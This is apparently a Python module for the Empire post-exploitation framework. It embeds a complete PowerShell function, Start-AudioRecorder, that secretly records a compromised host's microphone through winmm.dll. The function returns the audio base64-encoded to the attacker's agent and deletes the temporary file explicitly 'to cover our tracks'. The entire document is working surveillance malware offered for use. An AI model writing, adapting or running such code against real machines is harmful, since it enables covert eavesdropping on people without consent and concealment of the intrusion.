from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Start-AudioRecorder',

            # list of one or more authors for the module
            'Author': ['@hackingscool'],

            # more verbose multi-line description of the module
            'Description': ('This module uses winmm.dll to capture audio.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : 'wav',

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,
            
            # The minimum PowerShell version needed for the module to run
            'MinPSVersion' : '2',

            # list of any references/other comments
            'Comments': [
                'comment',
                'https://github.com/hackingscool/expert/Start-AudioRecorder.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run the module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'RecordTime' : {
                'Description'   :   'Length of time to record in seconds. Defaults to 10.',
                'Required'      :   False,
                'Value'         :   ''
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self):
        
        # the PowerShell script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        script = """
function Start-AudioRecorder
{
  <#
  .SYNOPSIS
  This function utilizes the winmm.dll to record audio from the host.

  Author: Hacking S'cool (@hackingscool)
  License: BSD 3-Clause

  .DESCRIPTION
  This function will capture audio input from the host's microphone. The captured audio is saved to a temporary file in the %TEMP% directory and then it is deleted before function returns, to cover our tracks.

  .PARAMETER RecordTime
  Amount of time to record in seconds. Defaults to 10.

  .EXAMPLE

  Start-AudioRecorder

  Record the audio for 10 seconds 

  .EXAMPLE

  Start-AudioRecorder -RecordTime 60 

  Record the Audio for one minute

  #>
  [CmdletBinding()]
  param
  (
    [Parameter()]
    [ValidateNotNullOrEmpty()]
    [int]$RecordTime
  )


  if (-not $PSBoundParameters['RecordTime']){
     $RecordTime = 10
  }

  $winmmdef =@"
[DllImport("winmm.dll", CharSet = CharSet.Ansi)]
public static extern int mciSendStringA(
string lpstrCommand,
string lpstrReturnString,
int uReturnLength,
IntPtr hwndCallback);
"@
     
  $f = [System.IO.Path]::GetTempFileName()
  $t = [System.IO.Path]::GetFileNameWithoutExtension($f)
  
  try{

     $winmm = Add-Type -MemberDefinition $winmmdef -ErrorAction SilentlyContinue -PassThru -name mciSendString

     $winmm::mciSendStringA("open new Type waveaudio Alias $($t)","",0,0)| Out-Null

     $winmm::mciSendStringA("record $($t)","",0,0)| Out-Null

     Start-Sleep -Seconds $RecordTime 

     $winmm::mciSendStringA("save $($t) $($f)","",0,0)| Out-Null

     $winmm::mciSendStringA("close $($t)","",0,0)| Out-Null

     $returnBytes = [System.IO.File]::ReadAllBytes($f)

     Remove-Item $f

     [System.Convert]::ToBase64String($returnBytes)
  }
  catch [Exception]{
     $_
  }

}
Start-AudioRecorder"""


        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code
        
        # add any arguments to the end execution of the script
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        return script
